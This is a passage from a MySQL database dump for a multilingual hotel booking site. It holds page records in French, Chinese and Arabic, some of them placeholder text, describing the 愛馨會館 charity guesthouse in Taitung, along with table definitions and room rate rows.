  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0,
  `add_date` int(11) DEFAULT NULL,
  `edit_date` int(11) DEFAULT NULL,
  `comment` int(11) DEFAULT 0,
  `rating` int(11) DEFAULT 0,
  `system` int(11) DEFAULT 0,
  `show_langs` text DEFAULT NULL,
  `hide_langs` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_page`
--

INSERT INTO `pm_page` (`id`, `lang`, `name`, `title`, `subtitle`, `title_tag`, `alias`, `descr`, `robots`, `keywords`, `intro`, `text`, `id_parent`, `page_model`, `article_model`, `home`, `checked`, `rank`, `add_date`, `edit_date`, `comment`, `rating`, `system`, `show_langs`, `hide_langs`) VALUES
(1, 1, 'Accueil', 'Lorem ipsum dolor sit amet', 'Consectetur adipiscing elit', 'Accueil', '', '', 'index,follow', '', '', '<blockquote><p>A man travels the world over in search of what he needs and returns home to find it.</p></blockquote><p style=\"text-align:center;\">- George A. Moore -</p>', NULL, 'home', '', 1, 1, 1, 1644370645, 1655966052, 0, 0, 0, '', ''),
(1, 2, '首頁', '歡迎蒞臨愛馨會館', '旅行，也可以做公益', '愛馨公益旅店', '', '', 'index,follow', '', '', '', NULL, 'home', '', 1, 1, 1, 1644370645, 1665647934, 0, 0, 0, '', ''),
(1, 3, 'ترحيب', 'هو سقطت الساحلية ذات, أن.', 'غير بمعارضة وهولندا، الإقتصادية قد, فقد الفرنسي المعاهدات قد من.', 'ترحيب', '', '', 'index,follow', '', '', '', NULL, 'home', '', 1, 1, 1, 1644370645, 1655966052, 0, 0, 0, '', ''),
(1, 5, '首頁', '歡迎蒞臨愛馨會館', '旅行，也可以做公益', '愛馨公益旅店', '', '', 'index,follow', '', '', '', NULL, 'home', '', 1, 1, 1, 1644370645, 1665647934, 0, 0, 0, '', ''),
(2, 1, 'Contact', 'Contact', '', 'Contact', 'contact', '', 'index,follow', '', '', '', NULL, 'contact', '', 0, 1, 11, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(2, 2, '聯絡我們', '愛馨聯絡我們', '', '愛馨聯絡我們', 'contact', '', 'index,follow', '', '', '', NULL, 'contact', '', 0, 1, 11, 1644370645, 1663557529, 0, 0, 0, '', ''),
(2, 3, 'جهة الاتصال', 'جهة الاتصال', '', 'جهة الاتصال', 'contact', '', 'index,follow', '', '', '', NULL, 'contact', '', 0, 1, 11, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(2, 5, '聯絡我們', '愛馨聯絡我們', '', '愛馨聯絡我們', 'contact', '', 'index,follow', '', '', '', NULL, 'contact', '', 0, 1, 11, 1644370645, 1663557529, 0, 0, 0, '', ''),
(3, 1, 'Mentions légales', 'Mentions légales', '', 'Mentions légales', 'mentions-legales', '', 'index,follow', '', '', '', NULL, 'page', '', 0, 1, 12, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(3, 2, '法律聲明', '愛馨法律聲明', '', '愛馨法律聲明', 'legal-notices', '', 'index,follow', '', '', '', NULL, 'page', '', 0, 1, 12, 1644370645, 1659946402, 0, 0, 0, '', ''),
(3, 3, 'يذكر القانونية', 'يذكر القانونية', '', 'يذكر القانونية', 'legal-notices', '', 'index,follow', '', '', '', NULL, 'page', '', 0, 1, 12, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(3, 5, '法律聲明', '愛馨法律聲明', '', '愛馨法律聲明', 'legal-notices', '', 'index,follow', '', '', '', NULL, 'page', '', 0, 1, 12, 1644370645, 1659946402, 0, 0, 0, '', ''),
(4, 1, 'Plan du site', 'Plan du site', '', 'Plan du site', 'plan-site', '', 'index,follow', '', '', '', NULL, 'sitemap', '', 0, 1, 13, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(4, 2, '網站地圖', '愛馨網站地圖', '', '愛馨網站地圖', 'sitemap', '', 'index,follow', '', '', '', NULL, 'sitemap', '', 0, 1, 13, 1644370645, 1659946435, 0, 0, 0, '', ''),
(4, 3, 'خريطة الموقع', 'خريطة الموقع', '', 'خريطة الموقع', 'sitemap', '', 'index,follow', '', '', '', NULL, 'sitemap', '', 0, 1, 13, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(4, 5, '網站地圖', '愛馨網站地圖', '', '愛馨網站地圖', 'sitemap', '', 'index,follow', '', '', '', NULL, 'sitemap', '', 0, 1, 13, 1644370645, 1659946435, 0, 0, 0, '', ''),
(5, 1, 'Ma première page', 'Ma première page', '', 'Ma première page', 'my-first-page', '', 'index,follow', '', '', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque fringilla vel est at rhoncus. Cras porttitor ligula vel magna vehicula accumsan. Mauris eget elit et sem commodo interdum. Aenean dolor sem, tincidunt ac neque tempus, hendrerit blandit lacus. Vivamus placerat nulla in mi tristique, fringilla fermentum nisl vehicula. Nullam quis eros non magna tincidunt interdum ac eu eros. Morbi malesuada pulvinar ultrices. Etiam bibendum efficitur risus, sit amet venenatis urna ullamcorper non. Proin fermentum malesuada tortor, vitae mattis sem scelerisque in. Curabitur rutrum leo at mi efficitur suscipit. Vivamus tristique lorem eros, sit amet malesuada augue sodales sed.</p>', NULL, 'page', 'article', 0, 1, 2, 1644370645, 1644397224, 0, 0, 0, '', ''),
(5, 2, '會館介紹', '愛馨會館介紹', '', '愛馨會館介紹', 'introduction', '', 'index,follow', '', '', '<p>  愛馨會館是一處充滿人情味、對婦女懷抱關切與協助，並帶動企業和民眾參與公益的據點，也是旅人心靈沉澱的文化空間。<br> </p><p>勵馨基金會結合婦女服務、休閒住宿、V,shop、辦公等多功能的「愛馨會館」，於五月十八日正式啟用，開幕典禮邀請台東縣長夫人陳伶燕、藝人蕭瑤與王宇婕母女蒞臨，一起揭牌祝福。基於「運用社會企業理念帶動企業、民眾參與公益，促進社會資源累積」的概念，在台東成立「愛馨會館」開展婦女新服務；這楝建築共有六個層樓，會館一樓的愛馨小舖將提供健康養生餐，一、二樓的空間也將提供給社會各界開會場所之用，三樓以上則提供愛馨人住宿服務。期待透過多面向的延伸服務，使社會大眾有更多機會參與公益。<br> </p><p> 「愛馨會館」原本是一棟頗具特色的民宿旅店，也是台東的地標，勵馨基金會結合原來建築物的特色，不只是成為辦公、服務的據點，更將原來的旅店住宿、餐飲功能，發展為勵馨服務弱勢婦女就業準備、婦女學習成長的據點，並將它的一樓店面成為說故事的店、宣示終止暴力的起點，希望藉由受暴婦女勇敢的故事、助人的故事、藝術的故事，再次賦予這棟大樓新的義意。雖然，房屋貸款沉重的壓力，但勵馨基金會認為為了東台灣的弱勢婦女，除了認真服務之外，也將努力募款，將資源投注在東台灣上。<br> </p><p> 勵馨基金會台東服務中心自二００三年七月成立以來，因服務方案的擴展，服務場地日漸不敷使用，在近八年的時間裡，因為沒有自己的辦公室，已歷經四次辛苦的搬家，現在終於有了自己的家—愛馨會館。勵馨基金會表示，有了這棟多功能的家，勵馨的服務將更深度、多元與擴展。</p><p>  <br> 勵馨基金會指出，「愛馨會館」可讓特殊就業需求的婦女，在這裡學習房務清整、餐飲製作、手工藝品製作等技能，並透過服務接待、說故事等過程，建立就業自信，做好就業能力的準備，以進入正式職場。另外，一樓的空間也將成為V,shop一個說故事的店，終止暴力的起點，裡面將展示勵馨在反性別暴力上的歷史軌跡，還有婦女製作的咖啡、餅乾、巧克力、琉璃珠，與各式導覽解說與婦女成長課程，歡迎旅客、社區民眾的參與。</p><p> </p><figure class=\"image\"><img src=\"https://ising.goh.org.tw/medias/media/big/17/3-1.jpg\" alt=\"\"></figure><figure class=\"image\"><img src=\"https://ising.goh.org.tw/medias/media/big/18/3-2.jpg\" alt=\"\"></figure><figure class=\"image\"><img src=\"https://ising.goh.org.tw/medias/media/big/19/3-3.jpg\" alt=\"\"></figure>', NULL, 'page', 'article', 0, 1, 2, 1644370645, 1677725564, 0, 0, 0, '', ''),
(5, 3, 'صفحتي الأولى', 'صفحتي الأولى', '', 'صفحتي الأولى', 'my-first-page', '', 'index,follow', '', '', '', NULL, 'page', 'article', 0, 1, 2, 1644370645, 1644397224, 0, 0, 0, '', ''),
(5, 5, '會館介紹', '愛馨會館介紹', '', '愛馨會館介紹', 'introduction', '', 'index,follow', '', '', '<p>  愛馨會館是一處充滿人情味、對婦女懷抱關切與協助，並帶動企業和民眾參與公益的據點，也是旅人心靈沉澱的文化空間。<br> </p><p>勵馨基金會結合婦女服務、休閒住宿、V,shop、辦公等多功能的「愛馨會館」，於五月十八日正式啟用，開幕典禮邀請台東縣長夫人陳伶燕、藝人蕭瑤與王宇婕母女蒞臨，一起揭牌祝福。基於「運用社會企業理念帶動企業、民眾參與公益，促進社會資源累積」的概念，在台東成立「愛馨會館」開展婦女新服務；這楝建築共有六個層樓，會館一樓的愛馨小舖將提供健康養生餐，一、二樓的空間也將提供給社會各界開會場所之用，三樓以上則提供愛馨人住宿服務。期待透過多面向的延伸服務，使社會大眾有更多機會參與公益。<br> </p><p> 「愛馨會館」原本是一棟頗具特色的民宿旅店，也是台東的地標，勵馨基金會結合原來建築物的特色，不只是成為辦公、服務的據點，更將原來的旅店住宿、餐飲功能，發展為勵馨服務弱勢婦女就業準備、婦女學習成長的據點，並將它的一樓店面成為說故事的店、宣示終止暴力的起點，希望藉由受暴婦女勇敢的故事、助人的故事、藝術的故事，再次賦予這棟大樓新的義意。雖然，房屋貸款沉重的壓力，但勵馨基金會認為為了東台灣的弱勢婦女，除了認真服務之外，也將努力募款，將資源投注在東台灣上。<br> </p><p> 勵馨基金會台東服務中心自二００三年七月成立以來，因服務方案的擴展，服務場地日漸不敷使用，在近八年的時間裡，因為沒有自己的辦公室，已歷經四次辛苦的搬家，現在終於有了自己的家—愛馨會館。勵馨基金會表示，有了這棟多功能的家，勵馨的服務將更深度、多元與擴展。</p><p>  <br> 勵馨基金會指出，「愛馨會館」可讓特殊就業需求的婦女，在這裡學習房務清整、餐飲製作、手工藝品製作等技能，並透過服務接待、說故事等過程，建立就業自信，做好就業能力的準備，以進入正式職場。另外，一樓的空間也將成為V,shop一個說故事的店，終止暴力的起點，裡面將展示勵馨在反性別暴力上的歷史軌跡，還有婦女製作的咖啡、餅乾、巧克力、琉璃珠，與各式導覽解說與婦女成長課程，歡迎旅客、社區民眾的參與。</p><p> </p><figure class=\"image\"><img src=\"https://ising.goh.org.tw/medias/media/big/17/3-1.jpg\" alt=\"\"></figure><figure class=\"image\"><img src=\"https://ising.goh.org.tw/medias/media/big/18/3-2.jpg\" alt=\"\"></figure><figure class=\"image\"><img src=\"https://ising.goh.org.tw/medias/media/big/19/3-3.jpg\" alt=\"\"></figure>', NULL, 'page', 'article', 0, 1, 2, 1644370645, 1677725564, 0, 0, 0, '', ''),
(6, 1, 'Recherche', 'Recherche', '', 'Recherche', 'search', '', 'noindex,nofollow', '', '', '', NULL, 'search', '', 0, 1, 14, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(6, 2, 'Search', 'Search', '', 'Search', 'search', '', 'noindex,nofollow', '', '', '', NULL, 'search', '', 0, 1, 14, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(6, 3, 'بحث', 'بحث', '', 'بحث', 'search', '', 'noindex,nofollow', '', '', '', NULL, 'search', '', 0, 1, 14, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(6, 5, 'Search', 'Search', '', 'Search', 'search', '', 'noindex,nofollow', '', '', '', NULL, 'search', '', 0, 1, 14, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(7, 1, 'Galerie', 'Galerie', '', 'Galerie', 'galerie', '', 'index,follow', '', '', '', NULL, 'page', 'gallery', 0, 1, 4, 1644370645, 1652426833, 0, 0, 0, '', ''),
(7, 2, '畫廊賞析', '愛馨畫廊賞析', '', '愛馨畫廊賞析', 'gallery', '', 'index,follow', '', '', '', NULL, 'page', 'gallery', 0, 1, 4, 1644370645, 1659946249, 0, 0, 0, '', ''),
(7, 3, 'صور معرض', 'صور معرض', '', 'صور معرض', 'gallery', '', 'index,follow', '', '', '', NULL, 'page', 'gallery', 0, 1, 4, 1644370645, 1652426833, 0, 0, 0, '', ''),
(7, 5, '畫廊賞析', '愛馨畫廊賞析', '', '愛馨畫廊賞析', 'gallery', '', 'index,follow', '', '', '', NULL, 'page', 'gallery', 0, 1, 4, 1644370645, 1659946249, 0, 0, 0, '', ''),
(8, 1, '404', 'Erreur 404 : Page introuvable !', '', '404 Page introuvable', '404', '', 'noindex,nofollow', '', '', '<p>L\'URL demandée n\'a pas été trouvée sur ce serveur.<br />\r\nLa page que vous voulez afficher n\'existe pas, ou est temporairement indisponible.</p>\r\n\r\n<p>Merci d\'essayer les actions suivantes :</p>\r\n\r\n<ul>\r\n	<li>Assurez-vous que l\'URL dans la barre d\'adresse de votre navigateur est correctement orthographiée et formatée.</li>\r\n	<li>Si vous avez atteint cette page en cliquant sur un lien ou si vous pensez que cela concerne une erreur du serveur, contactez l\'administrateur pour l\'alerter.</li>\r\n</ul>\r\n', NULL, '404', '', 0, 1, 16, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(8, 2, '404', '404 Error: Page not found!', '', '404 Not Found', '404', '', 'noindex,nofollow', '', '', '<p>The wanted URL was not found on this server.<br />\r\nThe page you wish to display does not exist, or is temporarily unavailable.</p>\r\n\r\n<p>Thank you for trying the following actions :</p>\r\n\r\n<ul>\r\n	<li>Be sure the URL in the address bar of your browser is correctly spelt and formated.</li>\r\n	<li>If you reached this page by clicking a link or if you think that it is about an error of the server, contact the administrator to alert him.</li>\r\n</ul>\r\n', NULL, '404', '', 0, 1, 16, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(8, 3, '404', '404 Error: Page not found!', '', '404 Not Found', '404', '', 'noindex,nofollow', '', '', '', NULL, '404', '', 0, 1, 16, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(8, 5, '404', '404 Error: Page not found!', '', '404 Not Found', '404', '', 'noindex,nofollow', '', '', '<p>The wanted URL was not found on this server.<br />\r\nThe page you wish to display does not exist, or is temporarily unavailable.</p>\r\n\r\n<p>Thank you for trying the following actions :</p>\r\n\r\n<ul>\r\n	<li>Be sure the URL in the address bar of your browser is correctly spelt and formated.</li>\r\n	<li>If you reached this page by clicking a link or if you think that it is about an error of the server, contact the administrator to alert him.</li>\r\n</ul>\r\n', NULL, '404', '', 0, 1, 16, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(9, 1, 'Chambres', 'Chambres', '', 'Chambres', 'chambres', '', 'index,follow', '', '', '', NULL, 'rooms', 'room', 0, 1, 3, 1644370645, 1644397271, 0, 0, 0, '', ''),
(9, 2, '客房介紹', '愛馨客房介紹', '', '愛馨客房介紹', 'rooms', '', 'index,follow', '', '', '', NULL, 'rooms', 'room', 0, 1, 3, 1644370645, 1659946213, 0, 0, 0, '', ''),
(9, 3, 'الغرف', 'الغرف', '', 'الغرف', 'rooms', '', 'index,follow', '', '', '', NULL, 'rooms', 'room', 0, 1, 3, 1644370645, 1644397271, 0, 0, 0, '', ''),
(9, 5, '客房介紹', '愛馨客房介紹', '', '愛馨客房介紹', 'rooms', '', 'index,follow', '', '', '', NULL, 'rooms', 'room', 0, 1, 3, 1644370645, 1659946213, 0, 0, 0, '', ''),
(10, 1, 'Réserver', 'Réserver', '', 'Réserver', 'reserver', '', 'noindex,nofollow', '', '', '', NULL, 'booking', '', 0, 1, 6, 1644370645, 1644398045, 0, 0, 1, '', ''),
(10, 2, '線上訂房', 'Booking', '', 'Booking', 'booking', '', 'noindex,nofollow', '', '', '', NULL, 'booking', '', 0, 1, 6, 1644370645, 1644398045, 0, 0, 1, '', ''),
(10, 3, 'الحجز', 'الحجز', '', 'الحجز', 'booking', '', 'noindex,nofollow', '', '', '', NULL, 'booking', '', 0, 1, 6, 1644370645, 1644398045, 0, 0, 1, '', ''),
(10, 5, '線上訂房', 'Booking', '', 'Booking', 'booking', '', 'noindex,nofollow', '', '', '', NULL, 'booking', '', 0, 1, 6, 1644370645, 1644398045, 0, 0, 1, '', ''),
(11, 1, 'Coordonnées', 'Coordonnées', '', 'Coordonnées', 'coordonnees', '', 'noindex,nofollow', '', '', '', 10, 'details', '', 0, 1, 7, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(11, 2, '細節', '訂房細節', '', '訂房細節', 'booking-details', '', 'noindex,nofollow', '', '', '', 10, 'details', '', 0, 1, 7, 1644370645, 1663557678, 0, 0, 1, '', ''),
(11, 3, 'تفاصيل الحجز', 'تفاصيل الحجز', '', 'تفاصيل الحجز', 'booking-details', '', 'noindex,nofollow', '', '', '', 10, 'details', '', 0, 1, 7, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(11, 5, '細節', '訂房細節', '', '訂房細節', 'booking-details', '', 'noindex,nofollow', '', '', '', 10, 'details', '', 0, 1, 7, 1644370645, 1663557678, 0, 0, 1, '', ''),
(12, 1, 'Paiement', 'Paiement', '', 'Paiement', 'paiement', '', 'noindex,nofollow', '', '', '', 13, 'payment', '', 0, 1, 10, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(12, 2, '付款', '付款', '', '付款', 'payment', '', 'noindex,nofollow', '', '', '', 13, 'payment', '', 0, 1, 10, 1644370645, 1663557718, 0, 0, 1, '', ''),
(12, 3, 'دفع', 'دفع', '', 'دفع', 'payment', '', 'noindex,nofollow', '', '', '', 13, 'payment', '', 0, 1, 10, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(12, 5, '付款', '付款', '', '付款', 'payment', '', 'noindex,nofollow', '', '', '', 13, 'payment', '', 0, 1, 10, 1644370645, 1663557718, 0, 0, 1, '', ''),
(13, 1, 'Résumé de la réservation', 'Résumé de la réservation', '', 'Résumé de la réservation', 'resume-reservation', '', 'noindex,nofollow', '', '', '', 11, 'summary', '', 0, 1, 8, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(13, 2, '摘要', '訂房摘要', '', '訂房摘要', 'booking-summary', '', 'noindex,nofollow', '', '', '', 11, 'summary', '', 0, 1, 8, 1644370645, 1663557757, 0, 0, 1, '', ''),
(13, 3, 'ملخص الحجز', 'ملخص الحجز', '', 'ملخص الحجز', 'booking-summary', '', 'noindex,nofollow', '', '', '', 11, 'summary', '', 0, 1, 8, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(13, 5, '摘要', '訂房摘要', '', '訂房摘要', 'booking-summary', '', 'noindex,nofollow', '', '', '', 11, 'summary', '', 0, 1, 8, 1644370645, 1663557757, 0, 0, 1, '', ''),
(14, 1, 'Espace client', 'Espace client', '', 'Espace client', 'espace-client', '', 'noindex,nofollow', '', '', '', NULL, 'account', '', 0, 1, 17, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(14, 2, '帳戶', '個人帳戶', '', '個人帳戶', 'account', '', 'noindex,nofollow', '', '', '', NULL, 'account', '', 0, 1, 17, 1644370645, 1659946553, 0, 0, 1, '', ''),
(14, 3, 'Account', 'Account', '', 'Account', 'account', '', 'noindex,nofollow', '', '', '', NULL, 'account', '', 0, 1, 17, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(14, 5, '帳戶', '個人帳戶', '', '個人帳戶', 'account', '', 'noindex,nofollow', '', '', '', NULL, 'account', '', 0, 1, 17, 1644370645, 1659946553, 0, 0, 1, '', ''),
(15, 1, 'Activités', 'Activités', '', 'Activités', 'reservation-activitees', '', 'noindex,nofollow', '', '', '', 10, 'booking-activities', '', 0, 2, 9, 1644370645, 1644391747, 0, 0, 1, '', ''),
(15, 2, 'Activities', 'Activities', '', 'Activities', 'booking-activities', '', 'noindex,nofollow', '', '', '', 10, 'booking-activities', '', 0, 2, 9, 1644370645, 1644391747, 0, 0, 1, '', ''),
(15, 3, 'Activities', 'Activities', '', 'Activities', 'booking-activities', '', 'noindex,nofollow', '', '', '', 10, 'booking-activities', '', 0, 2, 9, 1644370645, 1644391747, 0, 0, 1, '', ''),
(15, 5, 'Activities', 'Activities', '', 'Activities', 'booking-activities', '', 'noindex,nofollow', '', '', '', 10, 'booking-activities', '', 0, 2, 9, 1644370645, 1644391747, 0, 0, 1, '', ''),
(16, 1, 'Activités', 'Activités', '', 'Activités', 'activitees', '', 'noindex,follow', '', '', '', NULL, 'activities', 'activity', 0, 1, 5, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(16, 2, 'Activities', 'Activities', '', 'Activities', 'activities', '', 'noindex,follow', '', '', '', NULL, 'activities', 'activity', 0, 1, 5, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(16, 3, 'Activities', 'Activities', '', 'Activities', 'activities', '', 'noindex,follow', '', '', '', NULL, 'activities', 'activity', 0, 1, 5, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(16, 5, 'Activities', 'Activities', '', 'Activities', 'activities', '', 'noindex,follow', '', '', '', NULL, 'activities', 'activity', 0, 1, 5, 1644370645, 1644370645, 0, 0, 1, NULL, NULL),
(17, 1, 'Blog', 'Blog', '', 'Blog', 'blog', '', 'index,follow', '', '', '', NULL, 'blog', 'article-blog', 0, 1, 15, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(17, 2, '部落格', '愛馨部落格', '', '愛馨部落格', 'blog', '', 'index,follow', '', '', '', NULL, 'blog', 'article-blog', 0, 1, 15, 1644370645, 1659946502, 0, 0, 0, '', ''),
(17, 3, 'مدونة', 'مدونة', '', 'مدونة', 'blog', '', 'index,follow', '', '', '', NULL, 'blog', 'article-blog', 0, 1, 15, 1644370645, 1644370645, 0, 0, 0, NULL, NULL),
(17, 5, '部落格', '愛馨部落格', '', '愛馨部落格', 'blog', '', 'index,follow', '', '', '', NULL, 'blog', 'article-blog', 0, 1, 15, 1644370645, 1659946502, 0, 0, 0, '', ''),
(18, 1, '', '', '', '', '', '', 'index,follow', NULL, '', '', NULL, 'page2', 'gallery', 0, 1, 18, 1652429806, 1652432172, 0, NULL, NULL, '', ''),
(18, 2, '關於我們', '關於我們愛馨', '', '關於我們愛馨', 'aboutus', '', 'index,follow', NULL, '', '<p>愛馨會館是一處充滿人情味、對婦女懷抱關切與協助，並帶動企業和民眾參與公益的據點，也是旅人心靈沉澱的文化空間。</p><p>勵馨基金會結合婦女服務、休閒住宿、V,shop、辦公等多功能的「愛馨會館」，於五月十八日正式啟用，開幕典禮邀請台東縣長夫人陳伶燕、藝人蕭瑤與王宇婕母女蒞臨，一起揭牌祝福。<br>勵馨基於「運用社會企業理念帶動企業、民眾參與公益，促進社會資源累積」的概念，在台東成立「愛馨會館」開展婦女新服務；這楝建築共有六個層樓，會館一樓的愛馨小舖將提供健康養生餐，一、二樓的空間也將提供給社會各界開會場所之用，三樓以上則提供愛馨人住宿服務。期待透過多面向的延伸服務，使社會大眾有更多機會參與公益。</p><p>「愛馨會館」原本是一棟頗具特色的民宿旅店，也是台東的地標，勵馨基金會結合原來建築物的特色，不只是成為辦公、服務的據點，更將原來的旅店住宿、餐飲功能，發展為勵馨服務弱勢婦女就業準備、婦女學習成長的據點，並將它的一樓店面成為說故事的店、宣示終止暴力的起點，希望藉由受暴婦女勇敢的故事、助人的故事、藝術的故事，再次賦予這棟大樓新的義意。雖然，房屋貸款沉重的壓力，但勵馨基金會認為為了東台灣的弱勢婦女，除了認真服務之外，也將努力募款，將資源投注在東台灣上。</p><p>勵馨基金會台東服務中心自二００三年七月成立以來，因服務方案的擴展，服務場地日漸不敷使用，在近八年的時間裡，因為沒有自己的辦公室，已歷經四次辛苦的搬家，現在終於有了自己的家—愛馨會館。勵馨基金會表示，有了這棟多功能的家，勵馨的服務將更深度、多元與擴展。</p><p>勵馨基金會指出，「愛馨會館」可讓特殊就業需求的婦女，在這裡學習房務清整、餐飲製作、手工藝品製作等技能，並透過服務接待、說故事等過程，建立就業自信，做好就業能力的準備，以進入正式職場。另外，一樓的空間也將成為V,shop一個說故事的店，終止暴力的起點，裡面將展示勵馨在反性別暴力上的歷史軌跡，還有婦女製作的咖啡、餅乾、巧克力、琉璃珠，與各式導覽解說與婦女成長課程，歡迎旅客、社區民眾的參與。</p><figure class=\"image\"><img src=\"http://localhost/php7/resort2022/medias/media/big/1/f15f7b57ab31c217f471c6712a2654e0-taipei-101.jpg\" alt=\"\"></figure><p> </p>', NULL, 'page', 'gallery', 0, 1, 18, 1652429806, 1659947251, 0, NULL, NULL, '', ''),
(18, 3, '', '', '', '', '', '', 'index,follow', NULL, '', '', NULL, 'page2', 'gallery', 0, 1, 18, 1652429806, 1652432172, 0, NULL, NULL, '', ''),
(18, 5, '關於我們', '關於我們愛馨', '', '關於我們愛馨', 'aboutus', '', 'index,follow', NULL, '', '<p>愛馨會館是一處充滿人情味、對婦女懷抱關切與協助，並帶動企業和民眾參與公益的據點，也是旅人心靈沉澱的文化空間。</p><p>勵馨基金會結合婦女服務、休閒住宿、V,shop、辦公等多功能的「愛馨會館」，於五月十八日正式啟用，開幕典禮邀請台東縣長夫人陳伶燕、藝人蕭瑤與王宇婕母女蒞臨，一起揭牌祝福。<br>勵馨基於「運用社會企業理念帶動企業、民眾參與公益，促進社會資源累積」的概念，在台東成立「愛馨會館」開展婦女新服務；這楝建築共有六個層樓，會館一樓的愛馨小舖將提供健康養生餐，一、二樓的空間也將提供給社會各界開會場所之用，三樓以上則提供愛馨人住宿服務。期待透過多面向的延伸服務，使社會大眾有更多機會參與公益。</p><p>「愛馨會館」原本是一棟頗具特色的民宿旅店，也是台東的地標，勵馨基金會結合原來建築物的特色，不只是成為辦公、服務的據點，更將原來的旅店住宿、餐飲功能，發展為勵馨服務弱勢婦女就業準備、婦女學習成長的據點，並將它的一樓店面成為說故事的店、宣示終止暴力的起點，希望藉由受暴婦女勇敢的故事、助人的故事、藝術的故事，再次賦予這棟大樓新的義意。雖然，房屋貸款沉重的壓力，但勵馨基金會認為為了東台灣的弱勢婦女，除了認真服務之外，也將努力募款，將資源投注在東台灣上。</p><p>勵馨基金會台東服務中心自二００三年七月成立以來，因服務方案的擴展，服務場地日漸不敷使用，在近八年的時間裡，因為沒有自己的辦公室，已歷經四次辛苦的搬家，現在終於有了自己的家—愛馨會館。勵馨基金會表示，有了這棟多功能的家，勵馨的服務將更深度、多元與擴展。</p><p>勵馨基金會指出，「愛馨會館」可讓特殊就業需求的婦女，在這裡學習房務清整、餐飲製作、手工藝品製作等技能，並透過服務接待、說故事等過程，建立就業自信，做好就業能力的準備，以進入正式職場。另外，一樓的空間也將成為V,shop一個說故事的店，終止暴力的起點，裡面將展示勵馨在反性別暴力上的歷史軌跡，還有婦女製作的咖啡、餅乾、巧克力、琉璃珠，與各式導覽解說與婦女成長課程，歡迎旅客、社區民眾的參與。</p><figure class=\"image\"><img src=\"http://localhost/php7/resort2022/medias/media/big/1/f15f7b57ab31c217f471c6712a2654e0-taipei-101.jpg\" alt=\"\"></figure><p> </p>', NULL, 'page', 'gallery', 0, 1, 18, 1652429806, 1659947251, 0, NULL, NULL, '', ''),
(19, 2, '旅遊資訊', '旅遊資訊', '', '旅遊資訊', 'news', '', 'index,follow', NULL, '', '', NULL, 'page', 'article', 0, 1, 19, 1657097862, 1664259697, 0, NULL, NULL, '', ''),
(19, 5, '旅遊資訊', '旅遊資訊', '', '旅遊資訊', 'news', '', 'index,follow', NULL, '', '', NULL, 'page', 'article', 0, 1, 19, 1657097862, 1664259697, 0, NULL, NULL, '', '');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_page_file`
--

CREATE TABLE `pm_page_file` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_popup`
--

CREATE TABLE `pm_popup` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `title` varchar(250) DEFAULT NULL,
  `content` text DEFAULT NULL,
  `allpages` text DEFAULT NULL,
  `pages` text DEFAULT NULL,
  `background` varchar(20) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `publish_date` int(11) DEFAULT NULL,
  `unpublish_date` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_rate`
--

CREATE TABLE `pm_rate` (
  `id` int(11) NOT NULL,
  `id_room` int(11) NOT NULL,
  `start_date` int(11) DEFAULT NULL,
  `end_date` int(11) DEFAULT NULL,
  `id_package` int(11) DEFAULT NULL,
  `price` double DEFAULT 0,
  `child_price` double DEFAULT 0,
  `discount` double DEFAULT 0,
  `discount_type` varchar(10) DEFAULT NULL,
  `people` int(11) DEFAULT NULL,
  `price_sup` double DEFAULT NULL,
  `fixed_sup` double DEFAULT NULL,
  `id_tax` int(11) DEFAULT NULL,
  `taxes` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_rate`
--

INSERT INTO `pm_rate` (`id`, `id_room`, `start_date`, `end_date`, `id_package`, `price`, `child_price`, `discount`, `discount_type`, `people`, `price_sup`, `fixed_sup`, `id_tax`, `taxes`) VALUES
(29, 11, 1693526400, 1695772800, 1, 2200, NULL, 0, '', 3, NULL, NULL, NULL, ''),
(46, 17, 1677628800, 1680220800, 12, 5000, NULL, 0, '', 4, NULL, NULL, NULL, ''),
(47, 17, 1677628800, 1680220800, 13, 5500, NULL, 0, '', 4, NULL, NULL, NULL, ''),
